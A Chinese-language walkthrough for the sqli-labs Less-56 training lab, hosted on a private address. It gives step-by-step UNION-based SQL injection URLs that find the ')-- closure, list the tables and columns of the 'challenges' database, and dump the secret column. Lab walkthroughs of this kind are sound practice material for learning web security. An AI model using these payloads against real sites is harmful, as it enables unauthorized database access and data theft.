---
title: Less - 56
date: 2023-03-24T19:08:09Z
lastmod: 2023-03-24T19:16:07Z
---

# Less - 56

---

# 通关教程

---

## 1、判断闭合

---

```http
http://192.168.23.128/sqli-labs/Less-56/?id=1'--+ #回显错误
http://192.168.23.128/sqli-labs/Less-56/?id=1')--+ #回显正常
```

​![image](assets/image-20230324191050-6x3bmes.png)​

所以闭合方式')–+，并且为字符型注入

---

## 2、查看当前库

---

```http
http://192.168.23.128/sqli-labs/Less-56/?id=-1') union select 1,2,database()--+
```

​![image](assets/image-20230324191152-ljz2eme.png)​

---

## 3、查看challenges库下的所有表

---

```http
http://192.168.23.128/sqli-labs/Less-56/?id=-1') union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='challenges')--+
```

​![image](assets/image-20230324191305-jqugmot.png)​

---

## 4、查看9po9d7v0i2表下的所有字段

---

```http
http://192.168.23.128/sqli-labs/Less-56/?id=-1') union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='9po9d7v0i2')--+
```

​![image](assets/image-20230324191414-ddxs73m.png)​

---

## 5、查看secret_AMI8字段下的值

---

```http
http://192.168.23.128/sqli-labs/Less-56/?id=-1') union select 1,2,(select group_concat(secret_AMI8) from challenges.9po9d7v0i2)--+
```

​![image](assets/image-20230324191534-gkxk8kg.png)​

​![image](assets/image-20230324191607-4bc2y4d.png)​
